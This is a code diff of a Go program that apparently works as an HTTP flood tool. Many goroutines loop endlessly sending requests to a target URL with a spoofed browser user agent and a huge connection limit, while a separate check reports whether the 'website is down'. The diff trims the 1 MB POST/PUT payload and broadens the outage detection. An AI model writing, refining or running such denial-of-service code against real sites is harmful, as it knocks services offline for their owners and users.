@@ -14,7 +14,7 @@ import (
 
 func main() {
 	reader := bufio.NewReader(os.Stdin)
-	fmt.Print("Enter HTTP method (HEAD, GET, POST, PUT): ")
+	fmt.Print("Enter HTTP method (HEAD or GET): ")
 	methodBytes, _, _ := reader.ReadLine()
 	method := strings.ToUpper(strings.TrimSpace(string(methodBytes)))
 
@@ -36,8 +36,6 @@ func main() {
 		MaxConnsPerHost:     100000,
 	}
 
-	largePayload := strings.Repeat("a", 1<<20) // 1 MB payload
-
 	for i := 0; i < numThreads; i++ {
 		go func() {
 			defer wg.Done()
@@ -47,10 +45,6 @@ func main() {
 			req.Header.SetMethod(method)
 			req.Header.SetUserAgent("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537")
 			req.SetRequestURI(url)
-
-			if method == "POST" || method == "PUT" {
-				req.SetBodyString(largePayload)
-			}
 
 			for {
 				client.Do(req, nil)
@@ -75,7 +69,9 @@ func main() {
             start := time.Now()
             err := client.Do(reqStatus, respStatus)
             duration := time.Since(start)
-            if err != nil && !strings.Contains(err.Error(), "i/o timeout") && !strings.Contains(err.Error(), "dialing to the given TCP address timed out") && !strings.Contains(err.Error(), "tls handshake timed out") && !strings.Contains(err.Error(), "server closed connection before returning the first response byte") {
+            statusCode := respStatus.StatusCode()
+            body := string(respStatus.Body())
+            if err != nil || statusCode == 404 || statusCode == 504 || strings.Contains(body, "unavailable") {
                 fmt.Println("Website is down")
             } else {
                 fmt.Printf("Website is up ( %.2f ms)\n", float64(duration.Milliseconds()))
